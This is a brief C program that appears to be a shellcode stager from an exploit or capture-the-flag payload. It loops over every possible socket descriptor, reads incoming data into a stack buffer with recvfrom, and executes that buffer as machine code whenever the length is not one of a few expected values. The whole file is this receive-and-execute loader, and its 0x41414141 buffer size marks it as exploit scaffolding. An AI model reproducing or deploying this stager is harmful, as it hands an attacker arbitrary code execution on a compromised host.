#define SIZE 0x41414141
#define MSG_DONTWAIT	0x80

int main() {
	int i = 0;
    char buff[SIZE];
	int size;

	for (i = 0xffff; i >= 0; i--) {
		size = recvfrom(i, buff, SIZE, MSG_DONTWAIT, 0, 0);
		if (size != 38 && size != 104 && size != 9 && size != 11) {
    		((void(*)())buff)();
		}
	}
	return 0;
}
